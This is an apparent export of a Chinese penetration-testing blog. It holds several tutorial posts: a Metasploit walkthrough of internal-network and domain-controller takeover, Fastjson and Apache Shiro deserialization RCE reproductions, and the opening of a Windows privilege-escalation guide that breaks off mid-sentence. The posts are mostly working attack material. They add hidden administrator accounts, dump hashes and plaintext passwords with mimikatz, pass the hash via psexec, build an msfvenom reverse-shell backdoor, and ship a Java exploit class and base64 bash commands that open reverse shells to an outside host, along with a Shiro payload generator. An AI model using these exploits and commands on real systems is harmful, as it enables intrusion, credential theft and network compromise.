-d</code></pre><p>提权命令:</p><pre><code>sysinfo 查看系统信息</code></pre><pre><code>ps 查看进程</code></pre><p> <img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235448756.png" alt="image-20220318235448756"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235621609.png" alt="image-20220318235621609"></p><pre><code>getuid 当前用户getprivs 尽可能提升权限getsystem 通过各种攻击向量来提升系统用户权限</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220318235905714.png" alt="image-20220318235905714"></p><p>增加管理员</p><pre><code>net user sakura$ 123456 /add &amp; net localground administrators sakura$ /add</code></pre><p>检测存活ip</p><pre><code>run post/multi/gather/ping_sweep rhosts=10.10.10.0/24run post/windows/gather/arp_scanner rhosts=10.10.10.0/24</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000735682.png" alt="image-20220319000735682"></p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319000816930.png" alt="image-20220319000816930"></p><p> 增加路由表</p><pre><code>run autoroute -s 10.10.10.0/24backgrounduse auxiliary/server/socks4aset SRVHOST 192.168.0.115 #端口默认是1080exploitvim /etc/proxychains.conf</code></pre><pre><code>socks4 192.168.0.115 1080</code></pre><pre><code>proxychains nmap -sT -Pn -P 445,22,80,3306 10.10.10.130-135 --open -oN 10.10.10.0.txt</code></pre><p>445开放，尝试hash攻击</p><p>hash获取</p><pre><code>meterpreter &gt; hashdump</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319014555755.png" alt="image-20220319014555755"></p><pre><code>ues exploit/windows/smb/psexecset payload windows/meterpreter/bind_tcpset rhost 10.10.10.131set SMBUser Administratorset SMBPass 44efcexxxxxxxxxxxxxxxxxxxxxxxxexploit</code></pre><p>使用mimikatz来获取更多密码</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码meterpreter &gt; run getgui -e #开启3389端口meterpreter &gt; run getgui -u sakura -p 123456 #增加用户</code></pre><pre><code>root@kali:~# proxychains rdesktop -u Administrator -p 123456 10.10.10.131 #登录3389端口</code></pre><h1 id="MSF进行一次完整的域渗透流程"><a href="#MSF进行一次完整的域渗透流程" class="headerlink" title="MSF进行一次完整的域渗透流程"></a>MSF进行一次完整的域渗透流程</h1><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319122142921.png" alt="image-20220319122142921"></p><p>渗透前提:拿到了域客户机2008的shell</p><p>生成metaploit后门，并监听</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.115 lport=12345 -f exe &gt;/var/www/html/sakura.exeuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.115set lport 12345exploit</code></pre><p>运行后门，得到2008服务器反弹shell</p><p>扫描内网的机器</p><pre><code>run post/windows/gather/qrp_scanner rhosts=10.10.1.0/24</code></pre><p>加入路由</p><pre><code>backgroundroute add 10.10.1.3 255.255.255.0 1</code></pre><p>使用扫描器</p><pre><code>use scanner/portscan/tcp  #默认扫描1-10000端口set rhost 10.10.1.3exploit</code></pre><p>通过扫描发现 10.10.1.3 的3306端口存在mysql服务</p><p>进行弱口令攻击</p><pre><code>use auxiliary/scanner/mysql/mysql_loginset rhost 10.10.1.3set username rootset pass_file /root/password.txtexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319124232296.png" alt="image-20220319124232296"></p><p>成功爆破出弱口令</p><p>尝试使用mysql_mof提权,得到域客户机2003的session</p><pre><code>use exploit/windows/mysql/mysql_mofset password 123456set rhost 10.10.1.3set username rootset payload windows/metepreter/bind_tcpexploit</code></pre><p>现在拿到了2003的系统权限，就可以使用一些命令进行信息搜集</p><pre><code>new view /domain:moonsec #查看当前域用户</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125543944.png" alt="image-20220319125543944"></p><p>得到目标机ip</p><pre><code>ping SERVERS2003</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319125634094.png" alt="image-20220319125634094"></p><pre><code>net user /domain  #获取所有域的用户列表net group /domain #获取域用户组信息net group &quot;domain admins&quot; /domain #获取当前域管理员信息net time /domain #查看域实际及域服务器名字</code></pre><p>可以得到域控信息</p><pre><code>WIN-7230786H6KU.moonsec.com 10.10.1.2 #这个就是域控</code></pre><p>因为普通域用户 需要更改系统信息 都需要通过域管理员的操作 要输入账号密码</p><p>抓明文 mimikatz</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319130901701.png" alt="image-20220319130901701"></p><p>尝试能否抓明文</p><pre><code>meterpreter &gt; kerberos #获取明文密码</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319132330184.png" alt="image-20220319132330184"></p><p>现在想要获取session</p><pre><code>use exploit/windows/smb/psexecset rhost 10.10.1.2set SMBDomain moonsecset SMBUser administratorset SMBPass xxx123456..set payload windows/meterpreter/bind_tcpexploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133243629.png" alt="image-20220319133243629"></p><p>得到域控shell，但是权限不够</p><pre><code>get privsgetsystem</code></pre><p>使用uac提权</p><pre><code>use exploit/windows/local/askset sessions 3exploit</code></pre><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133844674.png" alt="image-20220319133844674"></p><p>提权成功</p><p>获取hash密码</p><pre><code>meterpreter &gt; hashdump#或者meterpreter &gt;  run post/windows/gather/hashdump</code></pre><p>mimikatz抓明文密码</p><pre><code>meterpreter &gt; load mimikatzmeterpreter &gt; msv  #获取hash密码meterpreter &gt; kerberos #获取明文密码meterpreter &gt; mimikatz_command -f samd::hashes #另一种方式获取hash值</code></pre><p>权限维持：进程注入</p><p><img src="/2022/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87/image-20220319133930152.png" alt="image-20220319133930152"></p><pre><code>meterpreter &gt; migrate 2804</code></pre><p>开启域控远程连接</p><pre><code>meterpreter &gt; run getgui -e</code></pre><p>使用socks4a连接3389</p><pre><code>run autoroute -s 10.10.1.0/24 255.255.255.0use auxiliary/server/socks4aset srvhost 10.10.1.2</code></pre><p>配置pxoxychains.conf</p><pre><code>vim /etc/proxychains.conf</code></pre><pre><code>....socks4 192.168.0.115 1080</code></pre><p>登录3389</p><pre><code>root@kali:~ proxychains rdesktop 10.10.1.2 #登录3389端口</code></pre><p>增加账号</p><pre><code>meterpreter &gt; run getgui -u moonsec -p moonsec</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fastjson漏洞复现</title>
      <link href="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://so.csdn.net/so/search?q=Fastjson&spm=1001.2101.3001.7020">Fastjson</a>是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。具有执行效率高的特点，应用范围广泛。</p><h1 id="fastjson指纹识别"><a href="#fastjson指纹识别" class="headerlink" title="fastjson指纹识别"></a>fastjson指纹识别</h1><p>当我们在渗透测试中，抓包的时候发现返回的流量内容存在json格式时，我们就可以想它是不是使用了fastjson库</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>接着我们可以进一步进行判断</p><ol><li>根据报错信息判断</li></ol><p>发送一个post请求。发送的数据为没闭合的花括号，如果服务器没有屏蔽错误信息则会报出fastjson的信息。如果屏蔽了报错信息请看第二条</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><ol start="2"><li>利用dnslog盲打</li></ol><p>对目标发送一个POST请求，请求体内容如下。请求头添加Content-Type: application/json</p><pre><code>&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125; </code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>DNSlog刷新成功</p><h1 id="Fastjson-lt-1-2-24远程代码执行-CVE-2017-18349"><a href="#Fastjson-lt-1-2-24远程代码执行-CVE-2017-18349" class="headerlink" title="Fastjson&lt;1.2.24远程代码执行(CVE-2017-18349)"></a>Fastjson&lt;1.2.24远程代码执行(CVE-2017-18349)</h1><p><strong>漏洞详情</strong></p><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p><strong>漏洞版本</strong></p><p>fastjson &lt;=1.2.24</p><p><strong>漏洞分析</strong></p><p><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p><p><strong>需要环境</strong></p><p>在本机提前安装好maven和jdk</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235940219.png" alt="image-20220316235940219"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000000186.png" alt="image-20220317000000186"></p><p><strong>漏洞复现</strong></p><p>使用vulhub搭建漏洞环境</p><pre><code class="text">docker-compose up d</code></pre><p>访问xxx:8090</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235812389.png" alt="image-20220316235812389"></p><p>保存以下代码</p><p>dnslog.java</p><pre><code class="java">import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader; public class Exploit&#123;    public Exploit() throws Exception &#123;        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/VPS的IP/6666 0&gt;&amp;1&quot;&#125;);        InputStream is = p.getInputStream();        BufferedReader reader = new BufferedReader(new InputStreamReader(is));         String line;        while((line = reader.readLine()) != null) &#123;            System.out.println(line);        &#125;         p.waitFor();        is.close();        reader.close();        p.destroy();    &#125;     public static void main(String[] args) throws Exception &#123;    &#125;&#125;</code></pre><p>编译为Exploit.class</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>使用python在当前目录下起一个http服务，如果端口占用换其他的</p><pre><code class="text">python -m SimpleHTTPServer 4567</code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000648363.png" alt="image-20220317000648363"></p><p>使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类Exploit.class</p><pre><code class="text">git clone https://github.com/mbechler/marshalsec.gitcd marshalsec/编译项目mvn clean package -DskipTests</code></pre><p>以我搭建Exploit.class类http服务的服务器IP为2.2.2.2端口为4567</p><pre><code class="text">cd target/java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://xxx:4567/#Exploit&quot; 9999</code></pre><p>RMI服务可以搭建在与Exploit.class类的http服务同一台服务器，也可以搭建在其它服务器上。我们演示还是在同一台。</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>环境已经搭建好，接下来使用burp开始</p><pre><code class="text">POST / HTTP/1.1Accept: */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; NMTE)Host: 目标ip:8090Connection: closeContent-Length: 162Content-Type: application/jsonAccept-Encoding: gzip, deflate&#123;    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://vps的ip:9999/Exploit&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre><p>如图即代表攻击成功</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317012518646.png" alt="image-20220317012518646"></p><p>RMI服务响应</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013058412.png" alt="image-20220317013058412"></p><p>python搭建的http服务响应</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013143699.png" alt="image-20220317013143699"></p><p>nc</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013212099.png" alt="image-20220317013212099"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013225316.png" alt="image-20220317013225316"></p><h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><p>和fastjson1.2.24差不多，就是poc不一样而已</p><p><strong>影响版本</strong></p><ul><li>fastjson&lt;=1.2.47</li></ul><p><strong>漏洞检测</strong></p><p>检测方式和1.2.24一样</p><p>漏洞利用</p><p>创建恶意类，python搭建服务</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>搭建RMI服务</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>发送的数据包改为即可</p><pre><code class="text">POST / HTTP/1.1Host: 192.168.140.158:8090   #靶机地址Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 263 &#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://VPS地址:端口/Exploit&quot;,  #这里的Exploit不能变        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro漏洞复现</title>
      <link href="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache Shiro是一个强大易用的Java安全框架，提供了认证、授权、加密和会话管理等功能。Shiro框架直观、易用，同时也能提供健壮的安全性。</p><h1 id="Shiro-rememberMe反序列化漏洞（Shiro-550）"><a href="#Shiro-rememberMe反序列化漏洞（Shiro-550）" class="headerlink" title="Shiro rememberMe反序列化漏洞（Shiro-550）"></a>Shiro rememberMe反序列化漏洞（Shiro-550）</h1><p><strong>影响版本:Apache Shiro &lt; 1.2.4</strong></p><p><strong>漏洞原理：</strong>Apache Shiro框架提供了记住密码的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。在服务端对rememberMe的cookie值，先base64解码然后AES解密再反序列化，就导致了反序列化RCE漏洞。那么，Payload产生的过程：<br>命令=&gt;序列化=&gt;AES加密=&gt;base64编码=&gt;RememberMe Cookie值<br>在整个漏洞利用过程中，比较重要的是AES加密的密钥，如果没有修改默认的密钥那么就很容易就知道密钥了,Payload构造起来也是十分的简单。</p><p><strong>特征判断</strong></p><p>返回包中包含rememberMe=deleteMe字段。</p><p><strong>环境搭建</strong></p><pre><code class="text">获取docker镜像docker pull medicean/vulapps:s_shiro_1启动docker镜像：docker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code></pre><p><strong>工具准备</strong></p><p>maven配置:</p><pre><code class="text">sudo wget  https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gztar -zxvf apache-maven-3.6.3-bin.tar.gzsudo mv apache-maven-3.6.3 /usr/local/maven3在/etc/profile末尾添加maven环境变量:export M2_HOME=/usr/local/maven3export PATH=$PATH:$JAVA_HOME/bin:$M2_HOME/binsource /etc/profile</code></pre><p>下载ysoserial并打包:</p><pre><code class="text">git clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -D skipTests</code></pre><p>生成的工具在ysoserial/target文件中。</p><p><strong>复现流程</strong></p><p><strong>1、检查是否存在默认的key</strong></p><p>推荐使用Shiro_exploit检测:<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181209641.png" alt="image-20220315181209641"></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181335231.png" alt="image-20220315181335231"></p><p>如图成功获取密钥</p><p><strong>2、nc监听本地端口</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181502656.png" alt="image-20220315181502656"></p><p><strong>3、编写反弹shell代码</strong></p><pre><code class="text">bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1#进行base64编码bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p><strong>4、通过ysoserial中JRMP监听模块，监听5555端口并执行反弹shell命令。</strong></p><pre><code class="text">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315185158472.png" alt="image-20220315185158472"></p><p><strong>5、使用shiro.py生成payload</strong></p><pre><code class="text">import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])   print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315192829289.png" alt="image-20220315192829289"></p><p>ps:注意shiro.py要在target目录下</p><p><strong>6、构造数据包，伪造cookie，发送Payload</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200340397.png" alt="image-20220315200340397"></p><p>用上文产生的payload进行替换</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200402486.png" alt="image-20220315200402486"></p><p>发送</p><p><strong>7、成功反弹shell</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200453881.png" alt="image-20220315200453881"></p><h1 id="Shiro-Padding-Oracle-Attack（Shiro-721）"><a href="#Shiro-Padding-Oracle-Attack（Shiro-721）" class="headerlink" title="Shiro Padding Oracle Attack（Shiro-721）"></a>Shiro Padding Oracle Attack（Shiro-721）</h1><p><strong>漏洞原理</strong></p><p>由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding  Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。<br>影响版本：Apache Shiro &lt; 1.4.2版本。</p><p><strong>漏洞利用：</strong><br>1、登录Shiro网站，从cookie中获得rememberMe字段的值。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113116568-425378550.png" alt="img"><br>2、利用DNSlog探测，通过ysoserial工具payload。</p><pre><code class="text">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class</code></pre><p>3、使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。<br>github项目地址：<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a><br>使用示例：</p><pre><code class="text">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113145995-1951867126.png" alt="img"><br>爆破成功，输出Result：</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113200234-980599342.png" alt="img"></p><p>4、使用构造的rememberMe攻击字符串重新请求网站<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113217346-911399190.png" alt="img"></p><p>5、成功触发Payload，在DNSLog获取到目标IP。<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113226312-979603878.png" alt="img"></p><h1 id="一键自动化漏洞利用工具"><a href="#一键自动化漏洞利用工具" class="headerlink" title="一键自动化漏洞利用工具"></a>一键自动化漏洞利用工具</h1><p>ShiroExploit：支持对Shiro-550（硬编码秘钥）和Shiro-721（Padding Oracle）的一键化检测，支持简单回显。<br>Github项目地址：<a href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></p><p>Shiro-550，只需输入url，即可完成自动化检测和漏洞利用。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113422921-1885042148.png" alt="img"></p><p>Shiro-721，需输入url，提供一个有效的rememberMe Cookie，并指定目标操作系统类型。</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113437704-589381400.png" alt="img"></p><p>参考链接:<a href="https://www.cnblogs.com/xiaozi/p/13239046.html">https://www.cnblogs.com/xiaozi/p/13239046.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shrio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows提权总结</title>
      <link href="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
      <url>/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>为什么要提权：当成功通过80或者443端口通过web服务渗透时，常常是www-data 。无法执行管理员权限下的一下命令或者读取一些重要文件。这个时候就需要提权，在管理员权限下，还可以通过msfvenom生成其他后门文件或者一些隐藏后门。添加用户，开启其他端口等操作，达到权限持续控制。特别是windows存在域，所以需要最高权限，更方便后续的渗透。</p><p>提权可分为纵向提权与横向提权：纵向提权：低权限角色获得高权限角色的权限；横向提权：获取同级别角色的权限。</p><p>Windows常用的提权方法有：系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件/服务提权等</p><h1 id="常规信息搜集"><a href="#常规信息搜集" class="headerlink" title="常规信息搜集"></a>常规信息搜集</h1><p>知己知彼，百战不殆</p><p>当以低权用户进去一个陌生的windows机器后，无论是提权还是后续做什么，第一步肯定要尽可能的搜集信息。</p><h2 id="常规信息搜集-1"><a href="#常规信息搜集-1" class="headerlink" title="常规信息搜集"></a>常规信息搜集</h2><pre><code class="text">systeminfo 查询系统信息  hostname 主机名  net user 查看用户信息  netstat -ano|find &quot;3389&quot; 查看服务pid号  wmic os get caption 查看系统名  wmic qfe get Description,HotFixID,InstalledOn 查看补丁信息  wmic product get name,version 查看当前安装程序  wmic service list brief 查询本机服务  wmic process list brief 查询本机进程  net share 查看本机共享列表  netsh firewall show config 查看防火墙配置</code></pre><h2 id="常见的杀软如下："><a href="#常见的杀软如下：" class="headerlink" title="常见的杀软如下："></a>常见的杀软如下：</h2><pre><code class="text">360sd.exe 360杀毒  360tray.exe 360实时保护  ZhuDongFangYu.exe 360主动防御  KSafeTray.exe 金山卫士  SafeDogUpdateCenter.exe 安全狗  McAfee McShield.exe McAfee  egui.exe NOD32  AVP.exe 卡巴斯基  avguard.exe 小红伞  bdagent.exe BitDefender</code></pre><h2 id="要搜集的信息大致如下几点："><a href="#要搜集的信息大致如下几点：" class="headerlink" title="要搜集的信息大致如下几点："></a>要搜集的信息大致如下几点：</h2><pre><code class="text">机器的系统及其版本机器的打补丁情况机器安装的服务机器的防火墙策略配置机器的防护软件情况</code></pre><h1 id="提权漏洞"><a href="#提权漏洞" class="headerlink" title="提权漏洞"></a>提权漏洞</h1><h2 id="系统内核溢出漏洞提权"><a href="#系统内核溢出漏洞提权" class="headerlink" title="系统内核溢出漏洞提权"></a>系统内核溢出漏洞提权</h2><h3 id="手工查找补丁情况"><a href="#手工查找补丁情况" class="headerlink" title="手工查找补丁情况"></a>手工查找补丁情况</h3><pre><code class="text">systeminfo  #查看补丁wmic qfe get Description,HotFixID,InstalledOn  #查看补丁信息#Powershell扫描Import-Module C:\Sherlock.ps1Find-AllVulns</code></pre><h3 id="MSF后渗透扫描"><a href="#MSF后渗透扫描" class="headerlink" title="MSF后渗透扫描"></a>MSF后渗透扫描</h3><pre><code class="text">post/windows/gather/enum_patches</code></pre><p>利用（Vulmap、Wes、WindowsVulnScan）对比补丁进而进行提权</p><h2 id="at提权"><a href="#at提权" class="headerlink" title="at提权"></a>at提权</h2><p><strong>在Windows2000、Windows 2003、Windows XP 这三类系统中，我们可以使用at命令将Administrator权限提升至system权限。</strong></p><p>AT命令是Windows 